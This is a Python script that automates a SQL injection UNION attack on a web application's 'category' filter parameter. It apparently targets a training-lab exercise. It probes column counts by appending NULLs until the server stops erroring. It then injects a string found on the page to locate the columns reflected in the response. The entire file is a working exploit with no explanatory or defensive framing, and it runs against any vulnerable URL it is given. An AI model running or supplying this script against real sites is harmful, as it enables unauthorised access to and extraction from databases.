import requests
import sys
import re

def check_server_response(url):
    response = requests.get(url)
    return response

def find_existing_string(content):
    matches = re.findall(r"Make the database retrieve the string: '([^']*)'", content)
    return matches[0] if matches else None

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

    base_url = sys.argv[1] + "/filter?category=' UNION SELECT "
    nulls = ["NULL"]

    while True:
        url = base_url + ", ".join(nulls) + " -- -"
        response = check_server_response(url)

        if response.status_code != 500:
            print(f"Server response is {response.status_code} with URL: {url}")
            existing_string = find_existing_string(response.text)
            if existing_string:
                print(f"Found existing string: {existing_string}")
                break
            else:
                print("No existing string found in the response.")
                sys.exit(1)

        nulls.append("NULL")

    for i in range(len(nulls)):
        temp_nulls = nulls[:]
        temp_nulls[i] = f"'{existing_string}'"
        url = base_url + ", ".join(temp_nulls) + " -- -"
        response = check_server_response(url)

        if response.status_code != 500 and response.text.count(existing_string) > 1:
            print(f"Replacing NULL with '{existing_string}' at position {i} resulted in URL: {url}")
            print(f"String '{existing_string}' found {response.text.count(existing_string)} times in the response.")

